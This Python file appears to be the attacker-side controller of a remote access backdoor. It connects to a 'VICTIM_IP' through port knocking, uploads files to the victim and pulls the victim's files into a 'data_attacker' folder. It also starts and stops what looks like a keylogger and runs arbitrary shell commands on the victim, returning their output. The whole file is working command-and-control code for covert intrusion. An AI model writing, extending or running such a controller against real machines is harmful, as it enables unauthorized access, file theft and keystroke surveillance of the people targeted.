from pathlib import Path

from mods.knocking import send_port_knocks
from mods.protocol import check_for_ack, send_data, receive_data
from mods.shared import VICTIM_IP

def handle_command(cmd: str, args: list[str], state: dict) -> str:
    match cmd:
        case 'cn':
            return handle_cn(args, state)
        case 'sf':
            return handle_sf(args)
        case 'dl':
            return handle_dl(args)
        case 'k+':
            return handle_kstart(args, state)
        case 'k-':
            return handle_kstop(args, state)
        case 'wf':
            return handle_wf(args, state)
        case 'wd':
            return handle_wd(args, state)
        case 'rn':
            return handle_rn(args)
        case _:
            return 'Unknown command'


def handle_cn(_: list[str], state: dict) -> str:
    send_port_knocks(VICTIM_IP)
    if not check_for_ack():
        return f'Unable to connect to {VICTIM_IP}'
    state['connected_to_victim'] = True
    return f'Connected to {VICTIM_IP}'

def handle_sf(args: list[str]) -> str:
    filepath = Path(args[0])
    if not filepath.is_file():
        return 'Not a valid file path'
    filename = filepath.name
    send_data(b'sf ' + filename.encode(), VICTIM_IP)
    if not check_for_ack():
        return 'Victim did not reply in time'
    file_bytes = filepath.read_bytes()
    send_data(file_bytes, VICTIM_IP)
    return f'Sent file: {filename}'

def handle_dl(args: list[str]) -> str:
    raw_path = args[0]
    filepath = Path(raw_path)
    if not filepath.is_file():
        return 'Not a valid file path'
    send_data(b'dl ' + raw_path.encode(), VICTIM_IP)
    if not check_for_ack():
        return 'Victim unable to find file'
    file_bytes = receive_data()
    with open(f'data_attacker/{filepath.name}', 'wb') as f:
        f.write(file_bytes)
    return f'Downloaded file: {filepath.name}'


def handle_wf(args: list[str]) -> str:
    return f'Command not supported yet'

def handle_wd(args: list[str]) -> str:
    return f'Command not supported yet'

def handle_kstart(args: list[str], state: dict) -> str:
    send_data(b'k+', VICTIM_IP)
    file_bytes = receive_data()
    return file_bytes.decode()

def handle_kstop(args: list[str], state: dict) -> str:
    send_data(b'k-', VICTIM_IP)
    file_bytes = receive_data()
    return file_bytes.decode()

def handle_rn(args: list[str]) -> str:
    run_command = ' '.join(args)
    send_data(b'rn ' + run_command.encode('utf-8'), VICTIM_IP)
    if not check_for_ack():
        return f'Victim unable to run command: {run_command}'
    res = receive_data()
    return res.decode()